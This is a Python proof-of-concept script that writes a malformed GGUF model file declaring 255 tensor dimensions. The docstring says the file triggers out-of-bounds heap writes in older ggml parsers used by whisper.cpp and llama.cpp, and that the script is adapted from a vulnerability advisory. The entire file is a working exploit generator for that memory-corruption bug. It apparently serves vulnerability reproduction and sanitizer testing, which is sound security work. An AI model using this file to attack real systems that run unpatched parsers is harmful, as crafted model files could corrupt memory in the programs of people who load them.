#!/usr/bin/env python3
"""Craft a minimal GGUF file with n_dims > GGML_MAX_DIMS=4.

In the pre-fix gguf parser (e.g. whisper.cpp ggml.c at 8e391fcf3a, and the
shared ggml.c in llama.cpp before commit 8f5220d8), the parser reads
info->n_dims from the file then iterates ne[0..n_dims-1] writing into the
ne[] array — which is fixed-size GGML_MAX_DIMS=4. Setting n_dims=255 causes
251 OOB writes into the next gguf_tensor_info struct in ctx->infos[], which
ASAN should flag as heap-buffer-overflow.

Adapted (preserved verbatim) from the inline poc_code in
projects/whisper.cpp/vulns/GHSA-ggml-2025-parser.yaml.
"""

import struct
import sys


def craft_gguf_oob_ndims(filename: str) -> None:
    with open(filename, "wb") as f:
        f.write(b"GGUF")                        # magic
        f.write(struct.pack("<I", 3))           # version 3
        f.write(struct.pack("<Q", 1))           # n_tensors = 1
        f.write(struct.pack("<Q", 0))           # n_kv = 0
        # Tensor info entry
        name = b"oob_tensor"
        f.write(struct.pack("<Q", len(name)))   # name length
        f.write(name)                           # tensor name
        f.write(struct.pack("<I", 255))         # n_dims = 255 >> GGML_MAX_DIMS=4
        for _ in range(255):
            f.write(struct.pack("<q", 1))       # ne[i] = 1 for all 255 dims
        f.write(struct.pack("<I", 0))           # type = GGML_TYPE_F32
        f.write(struct.pack("<Q", 0))           # offset = 0


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "oob_ndims.gguf"
    craft_gguf_oob_ndims(out)
    print(f"wrote {out}")
